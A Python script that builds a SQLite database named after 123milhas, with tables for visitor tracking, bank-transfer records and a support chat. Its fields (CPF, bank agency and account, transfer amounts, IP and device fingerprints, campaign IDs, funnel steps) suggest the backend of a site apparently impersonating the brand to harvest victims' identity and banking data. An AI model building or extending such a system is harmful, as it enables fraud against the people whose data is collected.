#!/usr/bin/env python
"""Script para criar banco de dados SQLite do zero"""

import sqlite3
import os

DB_PATH = "123milhas.db"

# Remover banco antigo se existir
if os.path.exists(DB_PATH):
    os.remove(DB_PATH)
    print("🗑️ Banco antigo removido")

# Conectar
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()

# Tabela de tracking de visitas
cursor.execute("""
CREATE TABLE IF NOT EXISTS tracking_visits (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tracking_id TEXT UNIQUE NOT NULL,
    token TEXT,
    nome TEXT,
    cpf TEXT,
    email TEXT,
    banco_codigo TEXT,
    banco_nome TEXT,
    agencia TEXT,
    conta TEXT,
    valor_transferencia REAL,
    status_transferencia TEXT DEFAULT 'pendente',
    dispositivo_tipo TEXT,
    dispositivo_os TEXT,
    dispositivo_browser TEXT,
    dispositivo_resolucao TEXT,
    user_agent TEXT,
    ip_address TEXT,
    ip_forwarded TEXT,
    pagina_entrada TEXT,
    pagina_atual TEXT,
    pagina_saida TEXT,
    url_referrer TEXT,
    campanha_id TEXT,
    session_id TEXT,
    flow_completed INTEGER DEFAULT 0,
    current_step INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    metadata_json TEXT
)
""")

# Tabela de eventos de tracking
cursor.execute("""
CREATE TABLE IF NOT EXISTS tracking_events (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    tracking_id INTEGER,
    event_type TEXT,
    event_name TEXT,
    page_url TEXT,
    page_title TEXT,
    element_id TEXT,
    element_class TEXT,
    event_data TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (tracking_id) REFERENCES tracking_visits(id)
)
""")

# Tabela de transferências
cursor.execute("""
CREATE TABLE IF NOT EXISTS transferencias_registro (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    transferencia_id TEXT UNIQUE NOT NULL,
    tracking_id INTEGER,
    banco_codigo TEXT NOT NULL,
    banco_nome TEXT NOT NULL,
    agencia TEXT NOT NULL,
    conta TEXT NOT NULL,
    valor REAL NOT NULL,
    valor_original_total REAL,
    numero_cota INTEGER,
    status TEXT DEFAULT 'pendente',
    mensagem_retorno TEXT,
    tentativas INTEGER DEFAULT 1,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (tracking_id) REFERENCES tracking_visits(id)
)
""")

# Tabela de chat salas
cursor.execute("""
CREATE TABLE IF NOT EXISTS chat_salas (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sala_id TEXT UNIQUE NOT NULL,
    cliente_id TEXT,
    cliente_nome TEXT,
    atendente_id TEXT,
    atendente_nome TEXT,
    status TEXT DEFAULT 'aguardando',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")

# Tabela de chat mensagens
cursor.execute("""
CREATE TABLE IF NOT EXISTS chat_mensagens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    sala_id TEXT,
    de TEXT,
    texto TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (sala_id) REFERENCES chat_salas(sala_id)
)
""")

# Criar índices
cursor.execute(
    "CREATE INDEX IF NOT EXISTS idx_tracking_id ON tracking_visits(tracking_id)"
)
cursor.execute("CREATE INDEX IF NOT EXISTS idx_cpf ON tracking_visits(cpf)")
cursor.execute("CREATE INDEX IF NOT EXISTS idx_email ON tracking_visits(email)")
cursor.execute("CREATE INDEX IF NOT EXISTS idx_session ON tracking_visits(session_id)")
cursor.execute(
    "CREATE INDEX IF NOT EXISTS idx_events_tracking ON tracking_events(tracking_id)"
)
cursor.execute(
    "CREATE INDEX IF NOT EXISTS idx_transfer_tracking ON transferencias_registro(tracking_id)"
)
cursor.execute("CREATE INDEX IF NOT EXISTS idx_chat_sala ON chat_mensagens(sala_id)")

conn.commit()
conn.close()

print("✅ Banco de dados criado com sucesso!")
print(f"📁 Localização: {DB_PATH}")

# Verificar
conn = sqlite3.connect(DB_PATH)
cursor = conn.cursor()
cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
tables = cursor.fetchall()
print("\n📋 Tabelas criadas:")
for table in tables:
    print(f"  - {table[0]}")
conn.close()
